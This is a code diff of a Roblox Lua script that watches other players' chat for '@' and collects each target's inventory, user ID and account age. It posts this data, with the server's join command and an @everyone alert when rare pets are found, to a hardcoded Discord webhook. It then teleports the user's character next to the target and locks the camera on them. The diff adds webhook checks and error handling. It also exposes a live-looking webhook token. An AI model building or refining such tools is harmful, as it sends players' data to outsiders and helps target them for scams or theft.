@@ -1,59 +1,83 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
 
--- Webhook URL (replace with yours)
+-- Configure these:
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
+local RARE_PETS = {"T-Rex","Dragonfly","Raccoon","Mimic Octopus","Butterfly","Disco bee","Queen bee"}
 
--- Rare pets list
-local RARE_PETS = {
-    "T-Rex", "Dragonfly", "Raccoon", 
-    "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"
-}
+-- Verify webhook is working
+local function verifyWebhook()
+    local testPayload = {
+        content = "🔹 Webhook Connection Test - Roqate 2025",
+        embeds = {{
+            description = "This is a verification message",
+            color = 0x00FF00
+        }}
+    }
+    
+    local success, response = pcall(function()
+        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(testPayload))
+    end)
+    
+    if not success then
+        warn("Webhook failed: "..tostring(response))
+        return false
+    end
+    return true
+end
 
--- First send server info to Discord
+-- Actually send data with confirmation
+local function sendToDiscord(content, embedData)
+    if not verifyWebhook() then return false end
+    
+    local payload = {
+        content = content,
+        embeds = {embedData}
+    }
+    
+    local jsonData = HttpService:JSONEncode(payload)
+    local success, response = pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, jsonData)
+    end)
+    
+    if not success then
+        warn("Failed to send: "..tostring(response))
+        return false
+    end
+    return true
+end
+
+-- Send initial server info
 local function sendServerInfo()
     local placeId = game.PlaceId
     local jobId = game.JobId
     
-    local teleportScript = string.format(
-        'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")',
-        placeId, jobId
-    )
-    
-    local embed = {
-        title = "Server Info - Roqate 2025",
-        description = "Join using the script above",
-        color = 0x00FF00,
-        fields = {
-            {
-                name = "Player Count",
-                value = tostring(#Players:GetPlayers()),
-                inline = true
-            },
-            {
-                name = "Place ID",
-                value = tostring(placeId),
-                inline = true
+    local success = sendToDiscord(
+        "game:GetService('TeleportService'):TeleportToPlaceInstance("..placeId..", '"..jobId.."')",
+        {
+            title = "🚀 Server Join Info",
+            description = "Execute this script to join",
+            color = 0x3498db,
+            fields = {
+                {name = "Players", value = #Players:GetPlayers(), inline = true},
+                {name = "Place ID", value = placeId, inline = true}
             }
         }
-    }
+    )
     
-    local payload = {
-        content = teleportScript,
-        embeds = {embed}
-    }
-    
-    pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
-    end)
+    if success then
+        print("✅ Server info sent to Discord")
+    else
+        warn("❌ Failed to send server info")
+    end
 end
 
--- Send player info when they say @
-local function sendPlayerInfo(player)
+-- Handle player @ mentions
+local function handlePlayerMention(player)
+    -- Get player items
     local items = {}
     local backpack = player:FindFirstChild("Backpack")
     if backpack then
@@ -62,6 +86,7 @@ local function sendPlayerInfo(player)
         end
     end
     
+    -- Check for rare pets
     local hasRare = false
     for _,pet in pairs(RARE_PETS) do
         if table.find(items, pet) then
@@ -70,53 +95,39 @@ local function sendPlayerInfo(player)
         end
     end
     
-    local embed = {
-        title = "Player Triggered - "..player.Name,
-        description = table.concat(items, "\n"),
-        color = hasRare and 0xFF0000 or 0x0000FF,
-        fields = {
-            {
-                name = "User ID",
-                value = tostring(player.UserId),
-                inline = true
-            },
-            {
-                name = "Account Age",
-                value = tostring(player.AccountAge),
-                inline = true
+    -- Send to Discord
+    local success = sendToDiscord(
+        hasRare and "@everyone" or nil,
+        {
+            title = "🎯 Target: "..player.Name,
+            description = #items > 0 and table.concat(items, "\n") or "No items found",
+            color = hasRare and 0xFF0000 or 0x00FF00,
+            fields = {
+                {name = "User ID", value = player.UserId, inline = true},
+                {name = "Account Age", value = player.AccountAge, inline = true}
             }
         }
-    }
+    )
     
-    local payload = {
-        content = hasRare and "@everyone" or nil,
-        embeds = {embed}
-    }
+    if not success then return end
     
-    pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
-    end)
-end
-
--- Teleport and interact with player
-local function teleportToPlayer(target)
+    -- Only proceed if webhook sent successfully
     local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local root = char:WaitForChild("HumanoidRootPart")
-    local humanoid = char:WaitForChild("Humanoid")
     
-    local targetChar = target.Character or target.CharacterAdded:Wait()
+    local targetChar = player.Character or player.CharacterAdded:Wait()
     local targetTorso = targetChar:WaitForChild("UpperTorso") or targetChar:WaitForChild("Torso")
     local targetHead = targetChar:WaitForChild("Head")
     
-    -- Teleport to 4 studs away
+    -- Teleport to target
     root.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
     
-    -- Force first person
+    -- Force first person view
     LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
     LocalPlayer.CameraMaxZoomDistance = 0.5
     LocalPlayer.CameraMinZoomDistance = 0.5
     
-    -- Force look at head
+    -- Force look at target
     local lookConn
     lookConn = RunService.Heartbeat:Connect(function()
         Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetHead.Position)
@@ -131,34 +142,37 @@ local function teleportToPlayer(target)
     if lookConn then lookConn:Disconnect() end
 end
 
--- Handle chat messages
+-- Chat listener
 local function onChatted(player, message)
     if player == LocalPlayer then return end
     if not string.find(message, "@") then return end
     
-    -- First send player info to Discord
-    sendPlayerInfo(player)
-    
-    -- Then teleport to them
-    teleportToPlayer(player)
+    coroutine.wrap(function()
+        local success, err = pcall(handlePlayerMention, player)
+        if not success then
+            warn("Error handling mention: "..tostring(err))
+        end
+    end)()
 end
 
--- Initial setup
-sendServerInfo() -- Send server info immediately
-
--- Set up chat listeners
-for _,player in pairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
+-- Initialize
+if verifyWebhook() then
+    sendServerInfo()
+    
+    -- Setup chat listeners
+    for _,player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            player.Chatted:Connect(function(msg)
+                onChatted(player, msg)
+            end)
+        end
+    end
+    
+    Players.PlayerAdded:Connect(function(player)
         player.Chatted:Connect(function(msg)
             onChatted(player, msg)
         end)
-    end
-end
-
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg)
-        onChatted(player, msg)
     end)
-end)
-
-print("Script loaded - Server info sent to Discord")
+else
+    warn("Webhook verification failed - Check URL and try again")
+end
